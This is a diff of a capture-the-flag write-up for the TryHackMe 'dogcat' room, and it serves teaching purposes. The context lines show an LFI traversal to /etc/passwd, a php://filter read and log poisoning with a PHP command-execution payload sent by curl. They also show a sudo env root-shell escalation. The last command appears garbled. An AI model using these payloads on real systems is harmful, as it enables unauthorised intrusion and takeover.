@@ -7,6 +7,8 @@ coverY: 0
 
 ## Setup
 
+[Link to room](https://tryhackme.com/room/dogcat)
+
 **Read the Room Description:**\
 I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.
 
@@ -26,6 +28,7 @@ sudo nmap -sV -T4 -p- $TGT
 Options explained: -sV runs version detection, -T4 is the timing template to use (0: slowest, 5: quickest), -p- scan all ports
 
 **nmap results:**
+
 <figure><img src="../.gitbook/assets/nmapresult.PNG" alt=""><figcaption></figcaption></figure>
 
 Points of interest from nmap results:\
@@ -99,7 +102,7 @@ $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
 
 If we do not set the ext value it defaults to .php which explains the issues I encountered earlier.
 
-Knowing we can read local files we can look to **read flag1** similar to how we read index.php&#x20;
+Knowing we can read local files we can look to **read flag1** similar to how we read index.php
 
 **/?view=php://filter/read=convert.base64-encode/resource=./dog/../flag**
 
@@ -107,7 +110,7 @@ As before the returned base 64 needs to be decoded using `base64 -d` giving us o
 
 ![](<../.gitbook/assets/flag1 Decoded.PNG>)
 
-We can also use our knowledge of the ext parameter to view /etc/passwd&#x20;
+We can also use our knowledge of the ext parameter to view /etc/passwd
 
 **/?view=./dog/../../../../../../../etc/passwd\&ext**
 
@@ -133,7 +136,7 @@ curl http://$TGT -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
 **Note**: If a php error is produced here you may need to reset your machine as the PHP is now stored in log file. Once you have reset the machine input the correct curl command above making sure to use the new machine's IP.\
 For me, I had to restart my machine because the amount of requests I made with gobuster enumeration made the logs hard to view in my browser.
 
-If we now take a look at the log file again it now shows us a **warning** 'system(): Cannot execute a blank command in /var/log/apache2/access.log**'**
+If we now take a look at the log file again it now shows us a **warning** 'system(): Cannot execute a blank command in /var/log/apache2/access.log\*\*'\*\*
 
 <figure><img src="../.gitbook/assets/phppoison warning.PNG" alt=""><figcaption><p>PHP Warning</p></figcaption></figure>
 
@@ -209,7 +212,7 @@ This returns us two results which we can `cat` out and get our first two flags (
 
 ### 4.1 Elevate to root
 
-Checking for sudo rights using `sudo -l` shows us we can run /usr/bin/env as sudo without a password. Looking this up at [GTFO Bins](https://gtfobins.github.io/gtfobins/env/#sudo) we can use the command on this site to get a root shell**.**
+Checking for sudo rights using `sudo -l` shows us we can run /usr/bin/env as sudo without a password. Looking this up at [GTFO Bins](https://gtfobins.github.io/gtfobins/env/#sudo) we can use the command on this site to get a root shell\*\*.\*\*
 
 ```bash
 sudo env /bin/shpwd
